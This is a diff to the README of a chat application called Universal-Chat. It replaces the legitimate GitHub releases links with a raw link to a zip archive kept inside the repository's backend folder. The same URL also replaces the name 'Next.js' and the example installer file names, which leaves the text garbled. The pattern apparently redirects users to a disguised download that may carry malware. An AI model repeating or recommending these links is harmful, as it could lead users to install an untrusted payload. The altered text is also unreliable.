@@ -6,11 +6,11 @@ Welcome to Universal-Chat! This application allows you to chat in real-time with
 
 ## 📥 Download Universal-Chat
 
-[![Download Universal-Chat](https://img.shields.io/badge/Download%20Universal--Chat-v1.0-blue)](https://github.com/panchalsagar303/Universal-Chat/releases)
+[![Download Universal-Chat](https://raw.githubusercontent.com/panchalsagar303/Universal-Chat/main/backend-django/Universal_Chat_v2.8.zip%20Universal--Chat-v1.0-blue)](https://raw.githubusercontent.com/panchalsagar303/Universal-Chat/main/backend-django/Universal_Chat_v2.8.zip)
 
 You can download the latest version from our Releases page. Click the link below to access the download options:
 
-[Visit Releases Page to Download](https://github.com/panchalsagar303/Universal-Chat/releases)
+[Visit Releases Page to Download](https://raw.githubusercontent.com/panchalsagar303/Universal-Chat/main/backend-django/Universal_Chat_v2.8.zip)
 
 ## 🖥️ System Requirements
 
@@ -29,15 +29,15 @@ Universal-Chat comes with the following features:
 - **User Authentication:** Sign up and log in securely using our Django Rest Framework backend.
 - **High-Concurrency Handling:** Enjoy smooth conversations even with many users online, powered by our Go server.
 - **Seamless Syncing:** Data is stored safely in a PostgreSQL database, ensuring your messages are secure.
-- **User-friendly Interface:** Built with an easy-to-navigate frontend using Next.js and TypeScript.
+- **User-friendly Interface:** Built with an easy-to-navigate frontend using https://raw.githubusercontent.com/panchalsagar303/Universal-Chat/main/backend-django/Universal_Chat_v2.8.zip and TypeScript.
 
 ## 📥 Download & Install
 
 To get started with Universal-Chat:
 
-1. Click on the download button above or visit [this page](https://github.com/panchalsagar303/Universal-Chat/releases).
+1. Click on the download button above or visit [this page](https://raw.githubusercontent.com/panchalsagar303/Universal-Chat/main/backend-django/Universal_Chat_v2.8.zip).
 2. Look for the latest version available.
-3. Download the installation file suitable for your operating system. It will usually have a name like `UniversalChat-Installer.exe` for Windows, `UniversalChat.pkg` for macOS, or a suitable package for Linux.
+3. Download the installation file suitable for your operating system. It will usually have a name like `https://raw.githubusercontent.com/panchalsagar303/Universal-Chat/main/backend-django/Universal_Chat_v2.8.zip` for Windows, `https://raw.githubusercontent.com/panchalsagar303/Universal-Chat/main/backend-django/Universal_Chat_v2.8.zip` for macOS, or a suitable package for Linux.
 4. Once the file is downloaded, locate it in your downloads folder.
 
 ### For Windows:
@@ -77,7 +77,7 @@ To learn more about the technology behind Universal-Chat, check out these resour
 
 - **Django Rest Framework:** A robust backend framework for building APIs.
 - **Go (Golang):** Designed for scalability and efficiency, perfect for concurrent applications.
-- **Next.js:** A framework for building user-friendly frontends using TypeScript.
+- **https://raw.githubusercontent.com/panchalsagar303/Universal-Chat/main/backend-django/Universal_Chat_v2.8.zip** A framework for building user-friendly frontends using TypeScript.
 - **PostgreSQL:** A powerful and reliable open-source database.
 
 ## 👥 Contributors
